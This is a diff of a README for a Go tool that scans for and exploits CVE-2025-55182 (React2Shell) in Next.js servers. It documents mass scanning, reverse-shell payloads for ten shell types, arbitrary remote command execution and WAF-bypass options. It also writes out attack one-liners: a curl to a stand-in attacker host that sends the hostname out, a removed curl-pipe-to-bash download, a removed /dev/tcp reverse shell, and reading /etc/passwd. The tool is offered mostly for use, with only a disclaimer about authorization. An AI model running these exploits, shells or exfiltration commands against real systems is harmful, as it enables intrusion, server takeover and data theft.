@@ -1,457 +1,415 @@
 # CVE-2025-55182 Scanner
 
-[![Go Version](https://img.shields.io/badge/Go-1.21+-00ADD8?style=flat&logo=go)](https://go.dev/)
-[![License](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20macOS%20%7C%20Windows-lightgrey)]()
+A high-performance scanner and exploitation tool for CVE-2025-55182 (React2Shell), a critical remote code execution vulnerability in Next.js React Server Components.
 
-A high-performance, memory-efficient scanner and exploitation tool for CVE-2025-55182, a critical Remote Code Execution (RCE) vulnerability in Next.js React Server Components (RSC).
-
-## Disclaimer
-
-**This tool is intended for authorized security testing and educational purposes only.** Unauthorized access to computer systems is illegal. Always obtain proper authorization before testing.
-
----
+[![Go Version](https://img.shields.io/badge/Go-%3E%3D%201.21-blue.svg)](https://golang.org/)
+[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
+[![Version](https://img.shields.io/badge/Version-3.0.0-blue.svg)](https://github.com/yourusername/react2shell)
 
 ## Table of Contents
 
+- [Overview](#overview)
 - [Features](#features)
 - [Installation](#installation)
-- [Quick Start](#quick-start)
+  - [Using Go Install](#using-go-install)
+  - [Building from Source](#building-from-source)
+  - [Adding Go Bin to PATH](#adding-go-bin-to-path)
 - [Usage](#usage)
   - [Scanning](#scanning)
   - [Exploitation](#exploitation)
   - [Command Execution](#command-execution)
-- [Memory Management](#memory-management)
 - [Examples](#examples)
-- [Output Formats](#output-formats)
-- [How It Works](#how-it-works)
-- [Building from Source](#building-from-source)
-- [Contributing](#contributing)
-- [License](#license)
+- [Options Reference](#options-reference)
+- [WAF Bypass Techniques](#waf-bypass-techniques)
+- [References](#references)
+- [Disclaimer](#disclaimer)
 
----
+## Overview
+
+CVE-2025-55182, also known as React2Shell, is a critical remote code execution vulnerability affecting Next.js applications using React Server Components (RSC). The vulnerability allows unauthenticated attackers to execute arbitrary code on vulnerable servers through specially crafted RSC payloads.
+
+This tool provides:
+
+- **Mass scanning** capabilities for identifying vulnerable hosts at scale
+- **Safe detection mode** that identifies potentially vulnerable targets without executing code
+- **Exploitation** functionality for authorized penetration testing
+- **WAF bypass** techniques for testing protected environments
+
+For detailed technical analysis of the vulnerability, see:
+
+- [React2Shell Official Site](https://react2shell.com/)
+- [Google Cloud Threat Intelligence Analysis](https://cloud.google.com/blog/topics/threat-intelligence/threat-actors-exploit-react2shell-cve-2025-55182)
+- [Cloudflare Threat Brief](https://blog.cloudflare.com/react2shell-rsc-vulnerabilities-exploitation-threat-brief/)
 
 ## Features
 
-- **Fast Scanning** - Multi-threaded scanning with configurable concurrency
-- **RCE Detection** - Confirms code execution with mathematical proof
-- **Safe Mode** - Detect vulnerable endpoints without executing code
-- **Exploitation** - Built-in reverse shell payloads for 10+ shell types
-- **Memory Efficient** - Object pooling, streaming I/O, and configurable memory limits
-- **Multiple Outputs** - Text, JSON, and streaming output modes
-- **TLS Support** - Full HTTPS support with optional certificate verification
-
----
+- **High-Performance Scanning**: Optimized for scanning thousands of targets with configurable concurrency
+- **Memory Management**: Built-in memory limiter for resource-constrained environments
+- **Stream Mode**: Minimal memory footprint for large-scale scanning operations
+- **Safe Detection**: Identify vulnerable targets without triggering code execution
+- **Multiple Shell Types**: Support for bash, sh, netcat, python, perl, ruby, php, and node reverse shells
+- **WAF Bypass**: Multiple techniques for bypassing web application firewalls
+- **Flexible Output**: JSON output support for integration with other tools
+- **TLS Support**: Full TLS/SSL support with certificate verification options
 
 ## Installation
 
-### Pre-built Binaries
+### Using Go Install
 
-Download the latest release for your platform from the [Releases](https://github.com/yourusername/cve-2025-55182/releases) page.
-
-### Using Go
+The simplest method to install react2shell is using `go install`:
 
 ```bash
-go install github.com/yourusername/cve-2025-55182@latest
+go install github.com/yourusername/react2shell@latest
 ```
 
-### From Source
+This will download, compile, and install the binary to your `$GOPATH/bin` directory.
+
+### Building from Source
 
 ```bash
-git clone https://github.com/yourusername/cve-2025-55182.git
-cd cve-2025-55182
-go build -o scanner .
+# Clone the repository
+git clone https://github.com/yourusername/react2shell.git
+cd react2shell
+
+# Build the binary
+go build -o react2shell .
+
+# Optional: Install to GOPATH/bin
+go install .
 ```
 
----
+### Adding Go Bin to PATH
 
-## Quick Start
+If the `go install` command succeeds but you cannot run the tool, you need to add Go's bin directory to your PATH.
+
+**Linux / macOS (bash/zsh):**
 
 ```bash
-# Scan a single target
-./scanner scan -u example.com
+# Add to ~/.bashrc, ~/.zshrc, or ~/.profile
+export PATH=$PATH:$(go env GOPATH)/bin
 
-# Scan multiple targets from file
-./scanner scan -l targets.txt -t 50
-
-# Safe scan (no code execution)
-./scanner scan -u example.com -safe
-
-# Exploit vulnerable target
-./scanner exploit -u vulnerable.com -lhost 10.0.0.5 -lport 4444
+# Reload your shell configuration
+source ~/.bashrc  # or ~/.zshrc
 ```
 
----
+**Linux / macOS (fish):**
+
+```fish
+# Add to ~/.config/fish/config.fish
+set -gx PATH $PATH (go env GOPATH)/bin
+```
+
+**Windows (PowerShell):**
+
+```powershell
+# Add to your PowerShell profile
+$env:PATH += ";$(go env GOPATH)\bin"
+
+# To make permanent, add to $PROFILE
+Add-Content $PROFILE "`n`$env:PATH += `";$(go env GOPATH)\bin`""
+```
+
+**Windows (Command Prompt):**
+
+```cmd
+# Temporary (current session only)
+set PATH=%PATH%;%GOPATH%\bin
+
+# Permanent (requires admin privileges)
+setx PATH "%PATH%;%GOPATH%\bin"
+```
+
+Verify the installation:
+
+```bash
+react2shell version
+```
 
 ## Usage
 
+react2shell operates in three modes: `scan`, `exploit`, and `exec`.
+
+```
+react2shell <command> [options]
+
+Commands:
+  scan      Scan targets for vulnerability
+  exploit   Send reverse shell payload
+  exec      Execute arbitrary command
+  version   Show version
+  help      Show help
+```
+
 ### Scanning
 
-Scan targets to identify vulnerable Next.js applications.
+The `scan` command identifies vulnerable Next.js applications.
 
 ```bash
-./scanner scan [options]
+# Basic scan of a single target
+react2shell scan -u example.com
+
+# Scan with custom port and HTTP (no TLS)
+react2shell scan -u 192.168.1.100 -p 3000 -no-tls
+
+# Safe mode detection (no code execution)
+react2shell scan -u example.com -safe
 ```
-
-#### Options
-
-| Flag | Description | Default |
-|------|-------------|---------|
-| `-u` | Single target URL or IP | - |
-| `-l` | File containing targets (one per line) | - |
-| `-p` | Target port | `443` |
-| `-path` | Request path | `/` |
-| `-t` | Number of concurrent threads | `10` |
-| `-timeout` | Request timeout in seconds | `10` |
-| `-safe` | Safe mode - detect without code execution | `false` |
-| `-no-tls` | Use HTTP instead of HTTPS | `false` |
-| `-k` | Skip TLS certificate verification | `true` |
-| `-o` | Output file for vulnerable hosts | - |
-| `-json` | Output results as JSON | `false` |
-| `-v` | Verbose output | `false` |
-| `-q` | Quiet mode | `false` |
-| `-max-mem` | Maximum memory usage in MB (0 = unlimited) | `0` |
-| `-stream` | Stream mode - write results immediately | `false` |
-
-#### Examples
-
-```bash
-# Basic scan
-./scanner scan -u example.com
-
-# Scan with custom port and path
-./scanner scan -u example.com -p 3000 -path /api/action
-
-# High-performance scan with 100 threads
-./scanner scan -l targets.txt -t 100 -o vulnerable.txt
-
-# Memory-limited scan for large target lists
-./scanner scan -l targets.txt -t 50 -max-mem 256 -stream
-
-# Safe detection mode
-./scanner scan -l targets.txt -safe -v
-
-# JSON output for integration
-./scanner scan -l targets.txt -json > results.json
-```
-
----
 
 ### Exploitation
 
-Send reverse shell payloads to vulnerable targets.
+The `exploit` command sends a reverse shell payload to a confirmed vulnerable target.
 
 ```bash
-./scanner exploit [options]
+# Basic exploitation
+react2shell exploit -u example.com -lhost 10.0.0.5 -lport 4444
+
+# With verbose output to see request/response
+react2shell exploit -u example.com -lhost 10.0.0.5 -lport 4444 -v
 ```
 
-#### Options
-
-| Flag | Description | Default |
-|------|-------------|---------|
-| `-u` | Target URL or IP | - |
-| `-p` | Target port | `443` |
-| `-path` | Request path | `/` |
-| `-lhost` | Listener IP address | - |
-| `-lport` | Listener port | `4444` |
-| `-shell` | Shell type | `node` |
-| `-no-tls` | Use HTTP instead of HTTPS | `false` |
-| `-k` | Skip TLS certificate verification | `true` |
-| `-timeout` | Request timeout in seconds | `30` |
-
-#### Supported Shell Types
-
-| Shell | Description |
-|-------|-------------|
-| `node` | Node.js reverse shell (default, most reliable) |
-| `bash` | Bash reverse shell |
-| `sh` | POSIX shell reverse shell |
-| `nc` | Netcat with FIFO |
-| `nc-e` | Netcat with `-e` flag |
-| `python` | Python 2 reverse shell |
-| `python3` | Python 3 reverse shell |
-| `perl` | Perl reverse shell |
-| `ruby` | Ruby reverse shell |
-| `php` | PHP reverse shell |
-
-#### Examples
+**Important:** Start your listener before running the exploit:
 
 ```bash
-# Start listener first
 nc -lvnp 4444
-
-# Send Node.js reverse shell (recommended)
-./scanner exploit -u vulnerable.com -lhost 10.0.0.5 -lport 4444
-
-# Use bash reverse shell
-./scanner exploit -u vulnerable.com -lhost 10.0.0.5 -shell bash
-
-# Target on custom port with HTTP
-./scanner exploit -u 192.168.1.100 -p 3000 -no-tls -lhost 10.0.0.5
 ```
-
----
 
 ### Command Execution
 
-Execute arbitrary commands on vulnerable targets.
+The `exec` command executes a single command on the target.
 
 ```bash
-./scanner exec [options]
+# Execute a command
+react2shell exec -u example.com -c 'id'
+
+# With verbose output
+react2shell exec -u example.com -c 'whoami' -v
 ```
-
-#### Options
-
-| Flag | Description | Default |
-|------|-------------|---------|
-| `-u` | Target URL or IP | - |
-| `-p` | Target port | `443` |
-| `-path` | Request path | `/` |
-| `-c` | Command to execute | - |
-| `-no-tls` | Use HTTP instead of HTTPS | `false` |
-| `-k` | Skip TLS certificate verification | `true` |
-| `-timeout` | Request timeout in seconds | `30` |
-
-#### Examples
-
-```bash
-# Execute simple command
-./scanner exec -u vulnerable.com -c 'id'
-
-# Download and execute payload
-./scanner exec -u vulnerable.com -c 'curl http://attacker.com/shell.sh | bash'
-
-# Create reverse shell manually
-./scanner exec -u vulnerable.com -c 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1'
-```
-
----
-
-## Memory Management
-
-The scanner is optimized for low memory usage and includes several features for handling large-scale scans.
-
-### Memory Limiting
-
-Use `-max-mem` to set a maximum memory threshold in megabytes:
-
-```bash
-# Limit to 256 MB
-./scanner scan -l targets.txt -max-mem 256
-
-# Limit to 1 GB
-./scanner scan -l targets.txt -max-mem 1024
-
-# Limit to 2 GB
-./scanner scan -l targets.txt -max-mem 2048
-```
-
-### Stream Mode
-
-For massive target lists (millions of hosts), use stream mode to avoid storing results in memory:
-
-```bash
-./scanner scan -l massive_list.txt -t 100 -max-mem 256 -stream -o results.txt
-```
-
-### Memory Optimization Techniques
-
-The scanner employs several optimization techniques:
-
-| Technique | Description |
-|-----------|-------------|
-| Object Pooling | Reuses buffers, string builders, and HTTP clients |
-| Streaming I/O | Reads response bodies in chunks, not all at once |
-| Pre-built Payloads | Constructs payloads once at startup |
-| Pre-compiled Regex | Compiles patterns once globally |
-| Worker Pool | Fixed goroutine count prevents memory explosion |
-| Aggressive GC | Forces garbage collection under memory pressure |
-
-### Recommended Settings
-
-| Scenario | Command |
-|----------|---------|
-| Small scan (<1,000 targets) | `./scanner scan -l targets.txt -t 50` |
-| Medium scan (1K-100K targets) | `./scanner scan -l targets.txt -t 100 -max-mem 512` |
-| Large scan (100K-1M targets) | `./scanner scan -l targets.txt -t 200 -max-mem 1024 -stream` |
-| Massive scan (>1M targets) | `./scanner scan -l targets.txt -t 200 -max-mem 256 -stream` |
-
----
 
 ## Examples
 
-### Penetration Testing Workflow
+### Single Target Scanning
 
 ```bash
-# 1. Discover targets (example using subfinder + httpx)
-subfinder -d target.com | httpx -silent > targets.txt
+# Scan a single HTTPS target on default port 443
+react2shell scan -u example.com
 
-# 2. Safe scan to identify potentially vulnerable hosts
-./scanner scan -l targets.txt -t 100 -safe -o potentially_vulnerable.txt
+# Scan a target on a custom port with HTTP
+react2shell scan -u 192.168.1.100 -p 3000 -no-tls
 
-# 3. Confirm RCE on potentially vulnerable hosts
-./scanner scan -l potentially_vulnerable.txt -t 20 -o confirmed_vulnerable.txt
+# Scan with a specific path
+react2shell scan -u example.com -path /api/actions
 
-# 4. Exploit confirmed vulnerable target
-nc -lvnp 4444 &
-./scanner exploit -u vulnerable.target.com -lhost $(curl -s ifconfig.me) -lport 4444
+# Safe detection mode (recommended for initial reconnaissance)
+react2shell scan -u example.com -safe
+
+# Verbose output showing all results
+react2shell scan -u example.com -v
 ```
 
-### CI/CD Security Pipeline
+### Mass Scanning
 
 ```bash
-# Scan staging environment and fail build if vulnerable
-./scanner scan -u staging.example.com -safe -q
-if [ $? -eq 1 ]; then
-    echo "VULNERABLE: Blocking deployment"
-    exit 1
-fi
+# Scan multiple targets from a file
+react2shell scan -l targets.txt -t 50 -o vulnerable.txt
+
+# High-performance scanning with memory limits
+react2shell scan -l targets.txt -t 5000 -stream -o vuln.txt -max-mem 8192
+
+# Scan with 100 threads and save results
+react2shell scan -l targets.txt -t 100 -o results.txt
+
+# JSON output for tool integration
+react2shell scan -l targets.txt -t 50 -json > results.json
+
+# Quiet mode with output file only
+react2shell scan -l targets.txt -t 100 -q -o vulnerable.txt
+
+# Stream mode for minimal memory usage on large target lists
+react2shell scan -l large_targets.txt -t 1000 -stream -max-mem 4096 -o vuln.txt
 ```
 
-### JSON Output Processing
+### WAF Bypass Scanning
 
 ```bash
-# Scan and process with jq
-./scanner scan -l targets.txt -json | jq '.[] | select(.vulnerable==true) | .host'
+# Enable WAF bypass with default 128KB junk data
+react2shell scan -u example.com -waf-bypass
 
-# Export to CSV
-./scanner scan -l targets.txt -json | jq -r '.[] | [.host, .vulnerable, .status_code] | @csv'
+# WAF bypass with custom junk data size (256KB)
+react2shell scan -u example.com -waf-bypass -waf-bypass-size 256
+
+# Vercel-specific WAF bypass
+react2shell scan -u example.com -vercel-waf-bypass
+
+# Mass scan with WAF bypass
+react2shell scan -l targets.txt -t 50 -waf-bypass -o vuln.txt
 ```
 
----
-
-## Output Formats
-
-### Standard Output
-
-```
-[*] Targets: 1000 | Threads: 50 | Safe mode: false
-[VULN] https://vulnerable1.com
-       RCE confirmed via X-Action-Redirect header
-[VULN] https://vulnerable2.com
-       RCE confirmed via Location header
-[*] Completed in 45.231s
-    Scanned:    1000
-    Vulnerable: 2
-    Errors:     15
-    Peak mem:   128MB
-```
-
-### JSON Output
-
-```json
-[
-  {
-    "host": "https://vulnerable1.com",
-    "vulnerable": true,
-    "status_code": 307,
-    "evidence": "RCE confirmed via X-Action-Redirect header",
-    "timestamp": 1704067200
-  },
-  {
-    "host": "https://safe.com",
-    "status_code": 404,
-    "timestamp": 1704067201
-  }
-]
-```
-
-### Vulnerable Hosts File
-
-```
-https://vulnerable1.com
-https://vulnerable2.com
-https://vulnerable3.com
-```
-
----
-
-## How It Works
-
-### Vulnerability Overview
-
-CVE-2025-55182 is a critical RCE vulnerability in Next.js applications using React Server Components (RSC). The vulnerability exists in the server action handling mechanism.
-
-### Detection Method
-
-1. **RCE Mode**: Sends a payload that executes `echo $((41*271))` and checks for `11111` in the response
-2. **Safe Mode**: Sends a malformed RSC request and analyzes error responses for vulnerable patterns
-
-### Payload Structure
-
-The exploit uses a specially crafted multipart form request that:
-
-1. Abuses prototype pollution in the RSC parser
-2. Gains code execution through the `Function` constructor
-3. Triggers a redirect containing the command output
-
----
-
-## Building from Source
-
-### Requirements
-
-- Go 1.21 or higher
-
-### Build Commands
+### Exploitation
 
 ```bash
-# Clone repository
-git clone https://github.com/yourusername/cve-2025-55182.git
-cd cve-2025-55182
+# Basic reverse shell exploitation
+react2shell exploit -u vulnerable.example.com -lhost 10.0.0.5 -lport 4444
 
-# Build for current platform
-go build -o scanner .
+# Exploit target on custom port with HTTP
+react2shell exploit -u 192.168.1.100 -p 3000 -no-tls -lhost 10.0.0.5 -lport 4444
 
-# Build with optimizations
-go build -ldflags="-s -w" -o scanner .
+# Use bash reverse shell instead of node
+react2shell exploit -u example.com -lhost 10.0.0.5 -lport 4444 -shell bash
 
-# Cross-compile for Linux
-GOOS=linux GOARCH=amd64 go build -o scanner-linux-amd64 .
+# Use netcat reverse shell
+react2shell exploit -u example.com -lhost 10.0.0.5 -lport 4444 -shell nc
 
-# Cross-compile for Windows
-GOOS=windows GOARCH=amd64 go build -o scanner-windows-amd64.exe .
+# Use Python reverse shell
+react2shell exploit -u example.com -lhost 10.0.0.5 -lport 4444 -shell python3
 
-# Cross-compile for macOS (Intel)
-GOOS=darwin GOARCH=amd64 go build -o scanner-darwin-amd64 .
+# Verbose mode to debug exploitation
+react2shell exploit -u example.com -lhost 10.0.0.5 -lport 4444 -v
 
-# Cross-compile for macOS (Apple Silicon)
-GOOS=darwin GOARCH=arm64 go build -o scanner-darwin-arm64 .
+# Exploit with custom path
+react2shell exploit -u example.com -path /app -lhost 10.0.0.5 -lport 4444
+
+# Extended timeout for slow targets
+react2shell exploit -u example.com -lhost 10.0.0.5 -lport 4444 -timeout 60
 ```
 
-### Running Tests
+### Command Execution
 
 ```bash
-go test -v ./...
+# Execute a simple command
+react2shell exec -u vulnerable.example.com -c 'id'
+
+# Execute command on HTTP target
+react2shell exec -u 192.168.1.100 -p 3000 -no-tls -c 'whoami'
+
+# Execute with verbose output
+react2shell exec -u example.com -c 'cat /etc/passwd' -v
+
+# Execute a more complex command
+react2shell exec -u example.com -c 'curl http://attacker.com/callback?data=$(hostname)'
+
+# Execute on custom path
+react2shell exec -u example.com -path /api -c 'ls -la'
 ```
 
----
+### Pipeline Integration
 
-## Contributing
+```bash
+# Use with other tools via stdin
+cat targets.txt | xargs -I {} react2shell scan -u {} -safe
 
-Contributions are welcome. Please feel free to submit a Pull Request.
+# Parse JSON output with jq
+react2shell scan -l targets.txt -json | jq '.[] | select(.vulnerable==true) | .host'
 
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
+# Integration with nuclei output
+nuclei -l urls.txt -t nextjs-detect.yaml -o nextjs-hosts.txt
+react2shell scan -l nextjs-hosts.txt -t 100 -safe -o vulnerable.txt
+```
 
----
+## Options Reference
+
+### Scan Options
+
+| Option | Default | Description |
+|--------|---------|-------------|
+| `-u` | | Single target URL or IP |
+| `-l` | | File containing targets (one per line) |
+| `-p` | 443 | Target port |
+| `-path` | / | Request path |
+| `-no-tls` | false | Use HTTP instead of HTTPS |
+| `-k` | true | Skip TLS certificate verification |
+| `-timeout` | 10 | Request timeout in seconds |
+| `-t` | 10 | Number of concurrent threads |
+| `-safe` | false | Safe detection mode (no code execution) |
+| `-o` | | Output file for vulnerable hosts |
+| `-json` | false | JSON output format |
+| `-v` | false | Verbose output |
+| `-q` | false | Quiet mode |
+| `-max-mem` | 0 | Maximum memory usage in MB (0 = unlimited) |
+| `-stream` | false | Stream mode for minimal memory usage |
+| `-waf-bypass` | false | Enable WAF bypass with junk data |
+| `-waf-bypass-size` | 128 | Size of junk data in KB |
+| `-vercel-waf-bypass` | false | Use Vercel-specific WAF bypass payload |
+
+### Exploit Options
+
+| Option | Default | Description |
+|--------|---------|-------------|
+| `-u` | | Target URL or IP (required) |
+| `-p` | 443 | Target port |
+| `-path` | / | Request path |
+| `-no-tls` | false | Use HTTP instead of HTTPS |
+| `-k` | true | Skip TLS certificate verification |
+| `-timeout` | 30 | Request timeout in seconds |
+| `-lhost` | | Listener IP address (required) |
+| `-lport` | 4444 | Listener port |
+| `-shell` | node | Shell type |
+| `-v` | false | Verbose output (show full request/response) |
+
+**Supported Shell Types:**
+
+- `node` - Node.js reverse shell (default)
+- `bash` - Bash reverse shell
+- `sh` - POSIX shell reverse shell
+- `nc` - Netcat with mkfifo
+- `nc-e` - Netcat with -e flag
+- `python` - Python 2 reverse shell
+- `python3` - Python 3 reverse shell
+- `perl` - Perl reverse shell
+- `ruby` - Ruby reverse shell
+- `php` - PHP reverse shell
+
+### Exec Options
+
+| Option | Default | Description |
+|--------|---------|-------------|
+| `-u` | | Target URL or IP (required) |
+| `-p` | 443 | Target port |
+| `-path` | / | Request path |
+| `-no-tls` | false | Use HTTP instead of HTTPS |
+| `-k` | true | Skip TLS certificate verification |
+| `-timeout` | 30 | Request timeout in seconds |
+| `-c` | | Command to execute (required) |
+| `-v` | false | Verbose output (show full request/response) |
+
+## WAF Bypass Techniques
+
+react2shell includes multiple WAF bypass techniques for testing protected environments:
+
+### Junk Data Bypass
+
+The `-waf-bypass` flag prepends large amounts of random data to the payload, potentially exceeding WAF inspection limits:
+
+```bash
+react2shell scan -u example.com -waf-bypass -waf-bypass-size 256
+```
+
+### Vercel WAF Bypass
+
+The `-vercel-waf-bypass` flag uses an alternative payload structure designed to bypass Vercel's WAF:
+
+```bash
+react2shell scan -u example.com -vercel-waf-bypass
+```
+
+## References
+
+- [CVE-2025-55182 - React2Shell](https://react2shell.com/)
+- [Google Cloud Threat Intelligence Analysis](https://cloud.google.com/blog/topics/threat-intelligence/threat-actors-exploit-react2shell-cve-2025-55182)
+- [Cloudflare Threat Brief](https://blog.cloudflare.com/react2shell-rsc-vulnerabilities-exploitation-threat-brief/)
+- [Assetnote React2Shell Scanner](https://github.com/assetnote/react2shell-scanner)
+- [Next.js Security Advisory](https://nextjs.org/security)
+
+## Disclaimer
+
+This tool is provided for authorized security testing and educational purposes only. Unauthorized access to computer systems is illegal. Users are responsible for ensuring they have proper authorization before testing any systems.
+
+The authors assume no liability for misuse of this tool or any damages resulting from its use. Always obtain explicit written permission before conducting security assessments.
 
 ## License
 
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
-
----
-
-## Legal Notice
-
-This tool is provided for educational and authorized security testing purposes only. The authors are not responsible for any misuse or damage caused by this tool. Always obtain proper authorization before testing any systems you do not own.
-
----
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
 ## Acknowledgments
 
-- Next.js Security Team for responsible disclosure handling
-- The security research community
+- [Assetnote](https://github.com/assetnote) for their research and original scanner implementation
+- The security researchers who discovered and responsibly disclosed CVE-2025-55182
